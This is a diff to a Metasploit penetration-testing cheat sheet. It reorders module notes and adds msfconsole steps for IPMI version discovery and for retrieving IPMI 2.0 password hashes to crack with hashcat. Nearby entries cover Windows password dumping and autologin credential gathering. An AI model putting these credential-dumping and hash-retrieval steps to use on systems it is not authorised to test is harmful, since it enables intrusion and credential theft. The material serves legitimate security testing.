@@ -211,14 +211,16 @@ execute -f cmd.exe -i -H
   
 ## metasploit modules
 
-### windows/gather/arp-scanner
-
-To enumerate IPs in a network interface
 
 
 ### post/windows/gather/hasdump 
 
 Once you have a meterpreter session as system user, this module dumps all passwords.
+
+### windows/gather/arp-scanner
+
+To enumerate IPs in a network interface
+
 
 ### windows/gather/credentials/windows_autologin
 
@@ -252,4 +254,36 @@ One nice thing about veil is that it provides a metasploit RC file, meaning that
 
 ```bash
 msfconsole -r path/to/metasploitRCfile
+```
+
+
+### IPMI Information discovery
+
+[See ipmi service on UDP/623](623-intelligent-platform-management-interface-ipmi.md). This module discovers host information through IPMI Channel Auth probes:
+
+```msfc
+use auxiliary/scanner/ipmi/ipmi_version
+
+show actions ...actions... msf 
+set ACTION < action-name > msf 
+show options 
+# and set needed options
+run
+```
+
+### PMI 2.0 RAKP Remote SHA1 Password Hash Retrieval
+
+This module identifies IPMI 2.0-compatible systems and attempts to retrieve the HMAC-SHA1 password hashes of default usernames. The hashes can be stored in a file using the OUTPUT_FILE option and then cracked using hmac_sha1_crack.rb in the tools subdirectory as well hashcat (cpu) 0.46 or newer using type 7300. 
+
+```msf
+use auxiliary/scanner/ipmi/ipmi_dumphashes
+
+show actions
+
+set ACTION < action-name >
+
+show options
+# set <options>
+
+run
 ```
